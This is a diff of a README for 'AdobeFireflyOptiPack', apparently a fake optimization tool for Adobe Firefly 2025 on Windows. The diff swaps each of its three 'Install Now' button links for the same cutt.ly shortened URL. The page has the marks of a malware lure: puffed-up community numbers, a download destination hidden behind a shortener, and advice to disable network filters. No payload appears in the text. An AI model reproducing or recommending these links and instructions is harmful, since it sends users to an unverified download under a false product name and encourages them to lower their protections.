@@ -6,7 +6,7 @@
 
 **About AdobeFireflyOptiPack**: AdobeFireflyOptiPack is a repository for users of *Adobe Firefly 2025* on Windows, with community tools and configurations to optimize generative AI workflows for image, video, and audio creation. Enhance performance, reduce processing times, and boost creative outputs for a smoother experience. With 250K+ visitors and 200K+ members, elevate your AI designs today!
 
- <a href="https://adobe-firefly-opti-pack.github.io/.github/" target="_blank">
+ <a href="https://cutt.ly/GrNt1uHc" target="_blank">
   <img src="https://img.shields.io/badge/Install-Now-3498db" alt="Setup Guide Now" width="200" height="60" style="border:none;">
 </a>
 
@@ -22,7 +22,7 @@ Enhance your *Adobe Firefly 2025* with **AdobeFireflyOptiPack** on Windows:
 2. **Troubleshoot Access Issues** 🌐  
    Disable network filters or try browsers like Edge or Firefox if needed.
 
- <a href="https://adobe-firefly-opti-pack.github.io/.github/" target="_blank">
+ <a href="https://cutt.ly/GrNt1uHc" target="_blank">
   <img src="https://img.shields.io/badge/Install-Now-3498db" alt="Setup Guide Now" width="200" height="60" style="border:none;">
 </a>
 
@@ -35,7 +35,7 @@ Enhance your *Adobe Firefly 2025* with **AdobeFireflyOptiPack** on Windows:
 - 🤝 **Active Community**: Connect with 200K+ members.  
 - 📅 **Frequent Updates**: New tools for your projects.
 
- <a href="https://adobe-firefly-opti-pack.github.io/.github/" target="_blank">
+ <a href="https://cutt.ly/GrNt1uHc" target="_blank">
   <img src="https://img.shields.io/badge/Install-Now-3498db" alt="Setup Guide Now" width="200" height="60" style="border:none;">
 </a>
 
